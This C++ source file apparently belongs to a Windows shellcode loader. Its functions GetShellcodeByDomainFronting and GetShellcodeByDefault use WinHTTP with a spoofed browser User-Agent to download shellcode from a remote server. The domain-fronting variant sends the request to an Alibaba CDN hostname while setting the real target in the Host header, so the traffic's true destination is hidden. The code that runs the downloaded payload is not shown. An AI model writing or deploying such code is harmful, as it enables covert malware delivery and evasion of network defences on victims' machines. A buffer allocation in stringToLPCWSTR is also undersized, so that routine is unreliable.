#include "HttpConnect.h"
#include "AtlBase.h"
//#include <stdafx.h>
#include <vector>
#include <winsock2.h>
#include <Winhttp.h>
//#include <urlmon.h>
#include <iostream>
#include "AtlConv.h"
#pragma comment(lib, "winhttp")//这一句不能省略

string GetHost(string strUrl)
{
    int indexHttp = strUrl.find("http://");
    if (indexHttp != -1)
    {
        strUrl = strUrl.substr(7);
    }
    else
        return "";
    int indexSlash = strUrl.find("/");
    if (indexSlash != -1)
    {
        return strUrl.substr(0, indexSlash);
    }
    else
        return strUrl;
    return "";
}

LPCWSTR stringToLPCWSTR(std::string orig)
{
    size_t origsize = orig.length() + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t* wcstring = (wchar_t*)malloc(sizeof(wchar_t) * (orig.length() - 1));
    mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);

    return wcstring;
}
string GetRequestStr(string strUrl)
{
    int indexHttp = strUrl.find("http://");
    if (indexHttp != -1)
    {
        strUrl = strUrl.substr(7);
    }
    else
        return "";
    int indexSlash = strUrl.find("/");
    if (indexSlash == -1)
    {
        return "";
    }
    else
        return strUrl.substr(indexSlash);
}
string GetShellcodeByDomainFronting(string strUrl)
{
    string strHost = GetHost(strUrl);//获取Host
    string strRequestStr = GetRequestStr(strUrl);//获取请求路径
    string header = "Host: " + strHost + "\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
    strHost = strHost + ".w.cdngslb.com";
    USES_CONVERSION;
    LPCWSTR host = A2CW(strHost.c_str());//string转换为常量指针类型
    LPCWSTR requestStr = A2CW(strRequestStr.c_str());
    //Variables
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    vector <string>  vFileContent;
    BOOL  bResults = FALSE;

    //Note the definition of HINTERNET
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    string strHtml = "";// store the html code
    string str;//temporary variables

// Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host,
            INTERNET_DEFAULT_HTTP_PORT, 0);
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", requestStr,
            NULL, WINHTTP_NO_REFERER,
            NULL,
            NULL);

    //Add HTTP header 
    LPCWSTR header1 = A2CW(header.c_str());
    SIZE_T len = lstrlenW(header1);
    WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    //obtain the html source code
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n",
                        GetLastError());
                }
                else
                {
                    //printf("%s", pszOutBuffer);
                   // Data in vFileContent
                    vFileContent.push_back(pszOutBuffer);

                }
                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
        // Keep checking for data until there is nothing left.
       // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());
        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        for (int i = 0; i < (int)vFileContent.size(); i++)
        {
            str = vFileContent[i];
            strHtml += vFileContent[i];
        }
        return strHtml;
}


string GetShellcodeByDefault(string strUrl)
{
    string strHost = GetHost(strUrl);//获取Host
    string strRequestStr = GetRequestStr(strUrl);//获取请求路径
    string header = "Content-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
    USES_CONVERSION;
    LPCWSTR host = A2CW(strHost.c_str());//string转换为常量指针类型
    LPCWSTR requestStr = A2CW(strRequestStr.c_str());
    //Variables
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    vector <string>  vFileContent;
    BOOL  bResults = FALSE;

    //Note the definition of HINTERNET
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    string strHtml = "";// store the html code
    string str;//temporary variables
//2014年7月9日10:39:33
//Search the WinHttp API
//what to do when call the function WinHttpOpen？
// Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host,
            INTERNET_DEFAULT_HTTP_PORT, 0);
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", requestStr,
            NULL, WINHTTP_NO_REFERER,
            NULL,
            NULL);

    //Add HTTP header 
    LPCWSTR header1 = A2CW(header.c_str());
    SIZE_T len = lstrlenW(header1);
    WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    //obtain the html source code
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n",
                        GetLastError());
                }
                else
                {
                    //printf("%s", pszOutBuffer);
                   // Data in vFileContent
                    vFileContent.push_back(pszOutBuffer);

                }
                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
        // Keep checking for data until there is nothing left.
       // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());
        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        for (int i = 0; i < (int)vFileContent.size(); i++)
        {
            str = vFileContent[i];
            strHtml += vFileContent[i];
        }
        return strHtml;
}